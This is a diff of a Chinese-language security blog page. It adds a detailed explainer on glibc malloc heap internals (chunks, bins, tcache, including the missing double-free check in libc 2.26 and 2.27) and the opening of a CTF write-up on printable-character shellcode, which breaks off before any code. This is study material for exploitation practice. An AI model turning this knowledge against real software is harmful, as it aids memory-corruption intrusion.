@@ -155,6 +155,386 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/" class="post-title-link" itemprop="url">堆相关</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-19 16:48:28" itemprop="dateCreated datePublished" datetime="2022-03-19T16:48:28+08:00">2022-03-19</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-20 11:13:57" itemprop="dateModified" datetime="2022-04-20T11:13:57+08:00">2022-04-20</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="不错的文章"><a href="#不错的文章" class="headerlink" title="不错的文章"></a>不错的文章</h4><p><a target="_blank" rel="noopener" href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">Understanding glibc malloc – sploitF-U-N (wordpress.com)</a></p>
+<h2 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h2><p>堆是存在于程序虚拟地址空间中的一块连续的线性区域，其提供动态分配内存，允许程序申请大小未知的内存。</p>
+<p>堆的位置可以是紧贴数据段的上方，也可以是mmap中的某个位置</p>
+<h2 id="堆管理器"><a href="#堆管理器" class="headerlink" title="堆管理器"></a>堆管理器</h2><p>堆管理器在用户与操作系统之间作为动态内存管理的中间人，其响应用户申请内存的请求，并向操作系统申请内存，然后将其返回给用户程序。同时其管理用户所释放的内存，适时归还给操作系统。</p>
+<p>堆管理器并非由操作系统实现，而是<strong>由libc.so.6链接库</strong>实现，也就是说这段实现的代码存在于libc库中。其中封装了一些系统调用，为用户提供方便的动态内存分配接口的同时，力求高效的管理由系统调用申请来的内存。</p>
+<p>不同操作系统的堆管理器也是不一样的</p>
+<ul>
+<li>dlmalloc - General purpose allocator</li>
+<li><strong>ptmalloc2 - glibc</strong></li>
+<li>jemalloc - FreeBSD and Firefox</li>
+<li>tcmalloc - Google</li>
+<li>libumen - Solaris</li>
+</ul>
+<p>申请内存的系统调用：</p>
+<ul>
+<li>brk</li>
+<li>mmap（memory map - 内存映射）</li>
+</ul>
+<p>brk系统调用获取内存的方式就是从数据段的末尾（也就是data段的末尾）向上拓展一块空间，这块拓展出来的空间就属于heap段了，每执行一次brk系统调用，就把这块拓展的空间拓展得再大一些，使得堆内存不断地增长。</p>
+<p>mmap系统调用用于向操作系统申请一大块内存空间，这块申请得到的空间放在mmap段的某个位置。对于每一块新的内存申请，先在物理内存中开辟其空间，然后再映射到虚拟内存中。</p>
+<p>获取堆空间的这两种方式主要由两个要素决定：</p>
+<p>主线程可以用brk也可以用mmap，子线程只能用mmap。其次主线程如果申请的内存区域过大的话，会直接用mmap在mmap段得到一块大的空间，如果申请的比较小的话，那么会使用brk直接在数据段上方拓展一块空间。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>
+
+<p>如上图，程序通过malloc向堆管理器申请内存，堆管理器通过系统调用（brk或mmap）向操作系统申请内存。</p>
+<h2 id="堆管理器是如何工作的"><a href="#堆管理器是如何工作的" class="headerlink" title="堆管理器是如何工作的"></a>堆管理器是如何工作的</h2><p>首先需要知道三个关键词</p>
+<ul>
+<li>arena</li>
+<li>chunk</li>
+<li>bin</li>
+</ul>
+<h3 id="arena"><a href="#arena" class="headerlink" title="arena"></a>arena</h3><blockquote>
+<p>在 Linux 的早期，dlmalloc 被用作默认的内存分配器。但后来由于ptmalloc2的线程支持，它成为linux的默认内存分配器。线程支持有助于提高内存分配器性能，从而提高应用程序性能。在dlmalloc中，当两个线程同时调用malloc时，只有一个线程可以进入关键部分，因为freelist数据结构在所有可用线程之间共享。因此，在多线程应用程序中，内存分配需要时间，从而导致性能下降。在 ptmalloc2 中，当两个线程同时调用 malloc 时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的自由列表数据结构（也就是glibc中的bins）也是独立的。为每个线程维护单独的堆和 freelist 数据结构的这种行为称为 <strong>per thread arena</strong></p>
+</blockquote>
+<p>arena称为内存分配区，可以理解为堆管理器所持有的内存池。堆管理器与用户的内存交易发生在arena中。</p>
+<blockquote>
+<p>操作系统 –&gt; 堆管理器 –&gt; 用户</p>
+<p>物理内存 –&gt; arena –&gt; 可用内存</p>
+</blockquote>
+<p>例如主个线程在data段上方申请了堆这样一个段，那么在堆段中就会将申请得到的内存组合形成一个arena，这个arena分配区会有一个对应的控制结构来描述这个分配区的相关信息</p>
+<p>一个进程可以有多个arena，因为一个进程可以由多个线程构成，当线程较少的时候，arena与每个线程具有一对一映射，但是线程数量超过某个数量（与系统存在的内核数有关）时，glibc malloc在所有可用线程之间共享多个arena（这里涉及到arena上锁的知识，但是好像不重要）。</p>
+<p>arena里有一段控制结构，叫<code>malloc _state</code>，该结构的细节如下：</p>
+<p><strong>main arena</strong> <strong>的</strong> <strong>malloc_state</strong> <strong>并不是</strong> <strong>heap segment</strong> <strong>的一部分，而是一个全局变量，存储在</strong> <strong>libc.so</strong> <strong>的数据段</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Serialize access.  */</span></span><br><span class="line">    __libc_lock_define(, mutex);    <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">    <span class="keyword">int</span> flags;    <span class="comment">/* Fastbins */</span></span><br><span class="line">    mfastbinptr fastbinsY[ NFASTBINS ];    <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">    mchunkptr top;    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span>    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span>    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>malloc_state</code>中有两个链表，分别为<code>fastbinY[]</code>和<code>bins[]</code>，<code>fastbinsY[]</code>属于<code>fast bins</code>，而在<code>bins[]</code>中被划分了三个区域，分别属于<code>unsorted bin</code>、<code>small bins</code>和<code>large bins</code></p>
+<h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>一个线程的arena可以有多个堆（除了main_arena），每个堆都有属于自己的header。每个线程的arena在最开始的时候都只有一个堆，但当这个堆空间快用完的时候，新的堆空间（与原来堆空间不连续）就会被mmap()系统调用分配到这个arena中。</p>
+<p>main_arena没有多个堆，因此没有heap_info结构。当main_arena的空间不足的时候，其会使用sbrk()系统调用在原来的堆段上扩展空间，直到碰到mmap段。（这里不是很懂，主线程里申请的空间超过阈值时不也会使用mmap吗，那为什么说main_arena没有多个堆）</p>
+<h3 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h3><p>用户申请内存的单位，也是堆管理器管理内存的基本单位。</p>
+<p>glibc中用一个结构体定义了chunk，其中包含6个控制信息，不同的chunk所用到的控制信息的数量不尽相同</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">	INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">	INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">	<span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h4 id="malloced-chunk"><a href="#malloced-chunk" class="headerlink" title="malloced chunk"></a>malloced chunk</h4><p>如<code>void* ptr = malloc(0x100);</code>这条语句执行完毕后就会得到一个malloced chunk。一个malloced chunk的头部有两个字长的控制信息，剩下部分属于数据区域。如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-2.png" class>
+
+<p>malloc()返回的指针指向该chunk的<strong>数据区域</strong></p>
+<p>同时当我们<code>malloc(0x100)</code>的时候这个<code>0x100</code>对应的是一个chunk的数据区的大小，而一个malloced chunk还会有两个字长的控制信息，所以实际上得到的是一个<code>0x110</code>大小的chunk</p>
+<p>如果上一个chunk是free chunk，那么<code>prev size</code>用来记录这个free chunk的大小，如果上一个chunk是malloced chunk，那么<code>prev size</code>用来存储前一个chunk的数据</p>
+<h5 id="prev-size的覆用问题"><a href="#prev-size的覆用问题" class="headerlink" title="prev size的覆用问题"></a>prev size的覆用问题</h5><ul>
+<li><p>以64位平台为例，如执行了<code>void* ptr = malloc(0x20);free(ptr);</code>这样的操作后，再次<code>malloc(0x20)</code>的话，堆管理器因为有能刚好满足申请大小的free chunk，所以会把这块free chunk重新返回给用户使用。那么如果<code>malloc(0x28)</code>呢？实际上堆管理器会把下一块紧邻的chunk的prev size部分的一个字长也作为数据区来使用，补足缺少的0x8个字节。这时因为prev size记录的是上一个free chunk的大小，所以当上一个chunk不是free chunk的时候，prev size就不再使用，所以可以用来当作数据区的一部分。所以对于<code>malloc(0xn0)</code>和<code>malloc(0xn8)</code>，堆管理器分配给用户的空间是一样的。当有连续的malloced chunk的时候，往往这些chunk都只有一个字长的控制字段，即<code>size</code>，因为<code>prev size</code>被上一个malloced chunk用作数据区了。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-4.jpg" class>
+
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-5.jpg" class></li>
+</ul>
+<p>这里的<code>size</code>控制信息记录的是自己这个chunk的总大小（包含两个字长的控制信息），同时其最低三位（3bit）同样是控制信息。</p>
+<p>为什么能拿这三位用作控制信息？</p>
+<p>因为一个malloed chunk的头部有两个字长的控制信息，这就意味着一个malloced chunk的大小至少不会小于八个字节（32位的两个字长），同时chunk分配时遵循一个规则：只能分配字长整数倍的chunk（如字长64位下是8，则malloc得到的chunk只能是8的整数倍），如果申请分配的内存不是字长的整数倍，则堆管理器默认分配能满足申请内存大小且是字长整数倍的内存。这就意味着如果只记录大小的话，<code>size</code>的最低三位一定是0，所以干脆就把这三位用来记录别的控制信息，而不是浪费掉用来写0。</p>
+<p>其中<code>A</code>（NON_MAIN_ARENA）记录当前chunk是否不属于主线程，1表示不属于，0表示属于。<code>M</code>（IS_MAPPED）记录该chunk是否由mmap分配的，<code>P</code>(previous in use)代表上一个chunk是否在被使用，如果是1表示上一个chunk是malloced chunk，如果是0表示上一个chunk是free chunk。</p>
+<h4 id="free-chunk"><a href="#free-chunk" class="headerlink" title="free chunk"></a>free chunk</h4><p>如<code>free(ptr);</code>这条语句执行完毕后会改变上面语句得到的malloced chunk的结构，而不是令malloced chunk消失，这个free掉的chunk称为free chunk。</p>
+<blockquote>
+<p>free掉malloc分配的内存后这段内存并不会直接返还给物理内存，而是返回给堆管理器。这里涉及系统调用的问题，因为用户内存和物理内存的交互一定要进行系统调用才能进行，而频繁地进行系统调用会大量消耗资源，以缓冲区为例：</p>
+<p>缓冲区的存在就是为了减少系统调用，以stdout为例，若没有缓冲区，程序每接收到一个字符就要申请一次系统调用来向屏幕进行输出，这样会频繁地进行系统调用浪费资源，而缓冲区则是用来暂时存放这些要发送的字符的空间，满足了一定条件后再申请一次系统调用一次性地将缓冲区内的内容输出到屏幕中。</p>
+<p>而堆管理器其实也是类似作用，堆管理器作为操作系统和用户交互的中介，堆管理器一次性向操作系统申请超过用户需求的内存空间，然后把这些内存管理起来，这样用户在向堆管理器申请内存或释放内存时就不再需要经过系统调用，这样就大量减少了系统调用的次数。</p>
+<p>系统调用消耗资源的原因是从用户态代码切换到内核态代码时需要保存各种状态值和进行各种环境的部署，最后才能执行一个系统调用的函数。</p>
+</blockquote>
+<p>free chunk根据chunk大小、释放的时机被分成几种：</p>
+<ol>
+<li>fastbin free chunk</li>
+<li>smallbin free chunk</li>
+<li>unsortedbin free chunk</li>
+<li>largebin free chunk</li>
+</ol>
+<p>一个chunk被free掉之后会多形成几段控制信息，不同的free chunk所用到的控制信息不尽相同，具体如下图：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/free-chunk.jpg" class>
+
+<ul>
+<li><p><code>fd</code>（forward）指针在bin中指向下一个（非物理相邻）free chunk</p>
+</li>
+<li><p><code>bk</code>（backward）指针在bin中指向上一个（非物理相邻）free chunk</p>
+</li>
+<li><p><code>fd_nextsize</code>在large bin中指向前一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
+<p>（指向比自己小的链表中最大的链表的链头）</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fd_nextsize.jpg" class></li>
+<li><p><code>bk_nextsize</code>在large bin中指向后一个与当前chunk大小不同的第一个free chunk（不包含bin头指针）</p>
+<p>（指向比自己大的链表中最小的链表的链头）</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bk_nextsize.jpg" class>
+
+<ul>
+<li>一般空闲的large chunk在fd的遍历顺序中，按照由大到小的顺序排列。这样做可以避免在寻找合适chunk时挨个遍历</li>
+</ul>
+</li>
+</ul>
+<p>当一个chunk被free掉时，其会检查<code>size</code>中的<code>P</code>位来判断该chunk的上一个chunk是否也是free chunk，如果同样是free chunk则这两块free chunk会被合并，同时这个free chunk（刚被释放的这个chunk）的所有控制信息会作为合并后的chunk的数据区的一部分，图例如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/%E7%9F%A5%E8%AF%86%E7%82%B9-3.jpg" class>
+
+<p>有一点要注意的是这个被free掉的chunk中的所有数据在合并前后都不会被抹除，只是被作为合并后的chunk的数据区了。</p>
+<h5 id="物理链表"><a href="#物理链表" class="headerlink" title="物理链表"></a>物理链表</h5><p>因为<code>prev size</code>的存在，每个chunk都知道上一个chunk的大小，这样每个chunk就知道上一个chunk的起始地址，以此类推，这样每个内存分配区就知道了自己的分配空间和分配位置</p>
+<h5 id="逻辑链表"><a href="#逻辑链表" class="headerlink" title="逻辑链表"></a>逻辑链表</h5><p>有些chunk中存在<code>fd</code>、<code>bk</code>这样的指针，利用这些指针就可以构成一个逻辑链表</p>
+<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的 top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的 bin 都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的 top chunk。否则，就对 heap 进行扩展后再进行分配。在 main arena 中通过 sbrk 扩展 heap，而在 thread arena 中通过 mmap 分配新的 heap。</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/top-chunk.jpg" class>
+
+<p>需要注意的是，top chunk 的 prev_inuse 比特位始终为 1，否则其前面的 chunk 就会被合并到 top chunk 中。</p>
+<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>管理arena中空闲的chunk结构，<strong>以数组的形式存在</strong>，数组元素为相应大小的chunk链表的链表头，存在于arena的malloc_state中。</p>
+<ul>
+<li>unsorted bin</li>
+<li>fast bins</li>
+<li>small bins</li>
+<li>large bins</li>
+<li>（tcache）</li>
+</ul>
+<h5 id="bin的实现思想"><a href="#bin的实现思想" class="headerlink" title="bin的实现思想"></a>bin的实现思想</h5><p>bin的作用是保管用户暂时不需要的内存空间，当用户需要重新申请内存的时候，bin会在自己的链表中寻找有没有满足需求的chunk，如果bin中有刚好满足需求的chunk，则直接把这块chunk重新分配。</p>
+<p>那么要怎么知道bin中有没用正好满足需求的chunk呢？</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-1.jpg" class>
+
+<p>如上的<code>fast bins</code>：每一个特定大小的bin都是<code>fast bins</code>里的一部分，bin的本质是一个数组，数组中的每一项都对应一个特定大小的chunk链表的链表头，该链表头作为一个指针指向了一个符合其大小的fastbin free chunk，然后这些相同大小的chunk通过指针指向下一个chunk的头部来形成逻辑链表，这条串起来的链表最后形成了一个bin。</p>
+<p>对于fast bins，malloc分配内存时返回的就是满足需求大小的bin的链表中的最后一个chunk的数据体的地址，且fast bins中的每一个chunk的size中的P位都为1，这是为了防止chunk的合并等操作导致的速度的下降，这是fast bins的特点之一</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/bin-2.jpg" class>
+
+<p>fast bins是单向链表，其他类型的bins都是双向链表（fd指针指向下一个chunk，bk指针指向上一个chunk，第一个chunk的bk指针指向bin头，最后一个chunk的fd指针指向bin头）fd和bk其实属于数据体。</p>
+<p>双向链表中，最先连接到bins中的chunk最先离开（FIFO）。</p>
+<h4 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h4><ul>
+<li><p>bins[1]（malloc_state中的bins数组索引为1的元素属于<code>unsorted bin</code>）</p>
+</li>
+<li><p>可以视为free chunk回归其所属bin之前的缓冲区</p>
+</li>
+<li><p>unsorted bin 中的空闲 chunk 处于乱序状态，主要有两个来源</p>
+<ul>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
+</ul>
+</li>
+<li><p>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</p>
+</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/unsorted-bin.jpg" class>
+
+<p>unsorted bin的合并：</p>
+<p>当有某种特殊情况，例如：用户malloc了一段在large bins范围内的chunk，且未在unsorted bin中找到这样一段满足用户需求的chunk时，就会触发unsorted bin的合并。此时就会遍历整个unsorted bin，并且把可以合并起来的（物理相邻的）chunk合并，合并完成后就把合并的chunk分类到其所属的bin中。</p>
+<h4 id="fast-bins"><a href="#fast-bins" class="headerlink" title="fast bins"></a>fast bins</h4><ul>
+<li>fastbinsY[]</li>
+<li>单向列表</li>
+<li>LIFO（last in first out）</li>
+<li>管理 16、24、32、40、48、56、64 Byte的free chunk（32位下，64位就乘2）</li>
+<li>其中 chunk 的 in use 位（size字段的P位）总为1</li>
+<li>默认情况下（<strong>32 位系统为例</strong>）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的 chunk 的数据空间最大为 80 字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为 8 字节开始一直到 80 字节（注意这里说的是数据空间大小，也即除去 prev_size 和 size 字段部分的大小）</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/fast-bins.jpg" class>
+
+<h4 id="small-bins"><a href="#small-bins" class="headerlink" title="small bins"></a>small bins</h4><ul>
+<li><p>bins[2] ~ bins[63]</p>
+</li>
+<li><p>62个循环双向链表</p>
+</li>
+<li><p>FIFO（first in first out）</p>
+</li>
+<li><p>管理 16、24、32、40、……、504 Bytes 的 free chunks（32位下）</p>
+</li>
+<li><p>每个链表中存储的 chunk 大小都一致</p>
+</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/small-bins.jpg" class>
+
+<h4 id="large-bins"><a href="#large-bins" class="headerlink" title="large bins"></a>large bins</h4><ul>
+<li>bins[64] ~ bins[126]</li>
+<li>63个循环双向链表</li>
+<li>FIFO</li>
+<li>管理大于 504 Bytes 的 free chunks（32位下）</li>
+</ul>
+<p>结构如下：</p>
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-1.jpg" class>
+
+<img src="/2022/03/19/%E5%A0%86%E7%9B%B8%E5%85%B3/large-bins-2.jpg" class>
+
+<p>large bins跟其它bins的主要区别在于其每个bin中所管理的chunk的大小都是不固定的（如上图，一个large bin中管理了多个双向链表，同时任意两个链表之间保存的chunk大小都不一样，但是每个链表里保存的chunk大小都相同），也就是说一个large bin会维护一个大小范围内的chunk链表。</p>
+<p>同时large bin使用<code>fd_nextsize</code>和<code>bk_nextsize</code>指针来连接大小不同的链表，而每个链表中的chunk用fd和bk指针相互连接。<code>fd_nextsize</code>和<code>bk_nextsize</code>只在每个链表的链表头起作用。</p>
+<p>large bin使用FIFO分配策略，将先进入的chunk设置为链头，后面插入chunk在链头的后面，取出时取出链头的下一个chunk。</p>
+<p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。(需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong>)</p>
+<h4 id="tcache"><a href="#tcache" class="headerlink" title="tcache"></a>tcache</h4><p>tcache可以理解为super fast bin，其工作模式跟fast bin类似，同样是单向链表。在chunk存放到fast bins之前，所有的chunk都会优先存在到tcache中，tcache也会存放一些特定范围的bins。</p>
+<p>在2.26和2.27的libc中，tcache没有double free检查，往后的版本新加了tcache的安全检查。</p>
+<h4 id="last-reminder"><a href="#last-reminder" class="headerlink" title="last_reminder"></a>last_reminder</h4><p>刚分配的chunk被分割后剩下的部分</p>
+<h3 id="另一些注意的问题"><a href="#另一些注意的问题" class="headerlink" title="另一些注意的问题"></a>另一些注意的问题</h3><p>从<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/">堆相关数据结构 - CTF Wiki</a>]</p>
+<blockquote>
+<p><strong>最小的 chunk 大小</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>
+
+<p>这里，offsetof 函数计算出 fd_nextsize 在 malloc_chunk 中的偏移，说明最小的 chunk 至少要包含 bk 指针。</p>
+<p><strong>最小申请的堆内存大小</strong></p>
+<p>用户最小申请的内存大小必须是 2 * SIZE_SZ 的最小整数倍。</p>
+<p><strong>注：就目前而看 MIN_CHUNK_SIZE 和 MINSIZE 大小是一致的，个人认为之所以要添加两个宏是为了方便以后修改 malloc_chunk 时方便一些。</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/" class="post-title-link" itemprop="url">2021强网杯-shellcode</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-13 16:01:42 / 修改时间：21:04:27" itemprop="dateCreated datePublished" datetime="2022-03-13T16:01:42+08:00">2022-03-13</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>这题涉及的知识点比较多</p>
+<h4 id="可见字符范围内的shellcode构造。"><a href="#可见字符范围内的shellcode构造。" class="headerlink" title="可见字符范围内的shellcode构造。"></a>可见字符范围内的shellcode构造。</h4><img src="/2022/03/13/2021%E5%BC%BA%E7%BD%91%E6%9D%AF-shellcode/%E7%9F%A5%E8%AF%86%E7%82%B9-1.png" class>
+
+<p>一些shellcode的题目中存在这样的检查，如果输入不在限制的范围内则直接退出，通过检查则执行我们的输入，所以我们只能在限制的范围内构造出实现我们想要功能的shellcode</p>
+<p>可用的汇编指令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 